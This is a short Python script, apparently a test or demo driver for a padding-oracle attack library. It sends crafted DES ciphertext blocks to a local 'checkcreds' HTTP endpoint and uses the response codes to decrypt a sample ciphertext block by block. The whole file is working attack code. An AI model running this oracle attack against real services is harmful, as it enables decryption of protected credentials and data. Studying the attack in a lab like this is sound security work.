#!/usr/bin/python


import urllib
import logging
import sys

from oracle import PaddingAttack

import Colorer

sample_encrypted = "c9f2a3f0dc970fe8cf6a084b808569fa8f4106c6e916702377a66017885607c9e1924dde1ebe84fa23454ab976e075a96e341141b82449a7"

def try_sending(enc_block):
    base_url = "http://localhost:7171/checkcreds?enc="
    base_url += enc_block.encode("hex")
    response = urllib.urlopen(base_url)
    return_code = response.getcode()
    if return_code in [200, 404, 500]:
        return return_code
    raise Exception("Yikes!")


def main():
    if sys.argv[-1] == "-d":
        logging.basicConfig(level=logging.DEBUG)
    else:
        print "For DEBUG info pass in the '-d' flag at the command line."
        logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger("test_oracle_des")

    p = PaddingAttack(sample_encrypted[0:16].decode("hex"), "LOLOLOLO", try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[16:32].decode("hex"), sample_encrypted[0:16].decode("hex"), try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[32:48].decode("hex"), sample_encrypted[16:32].decode("hex"), try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[48:64].decode("hex"), sample_encrypted[32:48].decode("hex"), try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[64:80].decode("hex"), sample_encrypted[48:64].decode("hex"), try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[80:96].decode("hex"), sample_encrypted[64:80].decode("hex"), try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[96:112].decode("hex"), sample_encrypted[80:96].decode("hex"), try_sending, 8)
    logger.info(p.attack())







if __name__ == '__main__':
    main()

